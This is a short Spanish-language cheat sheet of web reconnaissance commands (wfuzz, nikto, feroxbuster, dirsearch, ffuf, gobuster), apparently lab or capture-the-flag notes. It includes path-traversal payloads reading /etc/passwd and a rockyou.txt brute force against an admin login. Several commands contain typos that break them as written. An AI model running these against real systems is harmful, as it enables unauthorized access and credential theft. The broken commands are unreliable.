## Wfuzz

Encontrar id’s de usuario :

```bash
wfuzz -c --hw 0 -z range,1-100 -H "Cookie: PHPSESSID=" -u "http://URL.php?id=FUZZ"
```

Encontrar payloads:

```bash
wfuzz -c -t 50 -w /usr/share/…/ -u “URL.php?FUZZ=../../../etc/passwd” —hl=1
curl URL.php?PAYLOAD=/etc/passwd
```

Fuerza bruta con cookie PHPSESSID:

```bash
wfuzz -c --hl=69 -H "Cookie: PHPSESSID=" -d "username=admin&password=FUZZ" -w /usr/share/wordlists/rockyou.txt -t 200 [http://url/](http://172.17.0.2/)
```

Encontrar subdominios:

```bash
wfuzz -c -t 200 -w /usr/share/…directory_list.txt -H ”Host:FUZZ.domain” -u IP —hh=302, 7022 o          —hl=5
```

## Nikto

```bash
nikto -h http://IP -C all
```

## Feroxbuster

```bash
feroxbuster -u URL -w DIR…medium.txt -t 50 -d 10 -x php,php.back,backup,txt,sh,html,js,java,py
```

## Dirsearch

```bash
dirsearch -u URL
```

## FFUF

Payloads: 

```bash
ffuf -u URL.php?FUZZ=/etc/passwd -w .. big.txt -fs 978 
```

Subdominio

```bash
fuff -c -w /dirb/big.txt -u http://domain -H “Host: FUZZ.domain” -fw 20
```

## Gobuster

subdominios:

```bash
gobuster vhost -u URL -w/usr/share/amass/wordlist/subdomains-top1mil-110000.txt -t 20 —append-domain
```

Directorios:

```bash
gobuster dir -u URL -w /usr/share/wordlists/dirbuster/directory-list.txt -x php,html,txt,zip
```
